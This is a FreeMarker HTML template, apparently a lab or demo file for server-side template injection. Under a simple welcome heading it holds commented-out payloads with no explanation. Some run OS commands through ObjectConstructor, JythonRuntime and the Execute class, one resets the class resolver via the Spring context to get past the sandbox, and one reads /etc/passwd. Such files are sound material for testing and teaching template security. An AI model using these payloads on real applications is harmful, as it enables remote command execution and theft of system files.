<!DOCTYPE html>
<html>
<head>
  <title>Welcome</title>
</head>
<body>
<h1>Welcome ${name}!</h1>
<h2></h2>
<#--<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","open",".").start()}-->
<#--<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("open -a Calculator")</@value>-->

<#--<#assign classloader=link.class.protectionDomain.classLoader>-->
<#--<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>-->
<#--<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>-->
<#--<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>-->
<#--${dwf.newInstance(ec,null)("id")}-->
<#--<#assign ac=springMacroRequestContext.webApplicationContext>-->
<#--<#assign fc=ac.getBean('freeMarkerConfiguration')>-->
<#--<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>-->
<#--<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${"freemarker.template.utility.Execute"?new()("id")}-->


<#--<#assign uri=object?api.class.getResource("/").toURI()>-->
<#--<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>-->
<#--<#assign is=input?api.getInputStream()>-->
<#--FILE:[<#list 0..999999999 as _>-->
<#--<#assign byte=is.read()>-->
<#--<#if byte == -1>-->
<#--  <#break>-->
<#--</#if>-->
<#--${byte}, </#list>]-->
</body>

</html>